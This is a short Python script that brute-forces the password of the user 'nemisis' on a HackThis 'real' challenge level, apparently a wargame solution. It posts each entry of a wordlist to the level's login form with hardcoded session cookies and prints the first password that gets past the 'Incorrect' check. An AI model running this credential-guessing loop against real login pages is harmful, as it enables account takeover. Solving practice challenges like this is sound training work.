import requests

cookies = {
    "autologin": "%5E%A2%8Dm%16%CC%27%E0%CD.%01%C0%80%9E%3AE%E6%AFb%A0%CA%E6%AD%3Cmo%E2%EC%E0%04Y%BF%85q%99%A4s%BAi8j%29%F5%F2%CBF%D4%A5%B7%7B%9C.%2Ff%CE%D0%9A%83v%A2%26%E0%11%C3",
    "member":"1",
    "PHPSESSID": "tfpq0ru9ica1v0uggusr2us0n3"
}

planet_bit_login = "https://www.hackthis.co.uk/levels/extras/real/4/planetbid/login.php"
email_beta = "https://www.hackthis.co.uk/levels/extras/real/4/email_beta/index.php?go"
with open('password.list', 'r') as f :
    passwords = f.readlines()

for p in passwords :
    p = p.rstrip()
    data = {"user2": "nemisis", "pass2": p}
    r = requests.post(email_beta, cookies=cookies, data=data)
    if 'Incorrect' in r.text :
        continue
    else :
        print p
        break
